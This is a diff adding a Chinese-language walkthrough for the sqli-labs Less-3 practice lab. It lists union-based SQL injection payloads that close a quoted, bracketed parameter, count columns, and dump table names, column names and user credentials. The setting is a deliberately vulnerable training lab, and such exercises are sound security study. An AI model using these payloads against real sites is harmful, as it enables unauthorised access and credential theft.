@@ -252,3 +252,51 @@ http://localhost/sqli-labs/Less-2/
 ~~~
 
 ![Less-2_11](./img/Less-2_11.PNG)
+
+
+
+### Less-3
+
++ 首先注入以下内容判断<code>sql</code>语句类型
+
+~~~ shell
+?id=1'
+~~~
+
+![Less-3_1](./img/Less-3_1.PNG)
+
+从上面的页面报错信息可推断<code>sql</code>语句是单引号字符型且有括号，所以需要闭合单引号且也需要考虑括号
+
+
+
++ 根据下面的代码构建进行<code>sql</code>注入，后面所有的代码以此为基础进行构造
+
+~~~ shell
+?id=1')--+
+?id=1') order by 3--+
+?id=-1') union select 1,2,3--+
+?id=-1') union select 1,database(),version()--+
+?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
+?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
+?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
+~~~
+
+
+
++ 注入下面的<code>sql</code>语句：
+
+~~~ shell
+?id=1')--+
+~~~
+
+![Less-3_2](./img/Less-3_2.PNG)
+
+
+
++ 注入以下语句进行
+
+~~~ shell
+?id=1') order by 3--+
+~~~
+
+![Less-3_3](./img/Less-3_3.PNG)
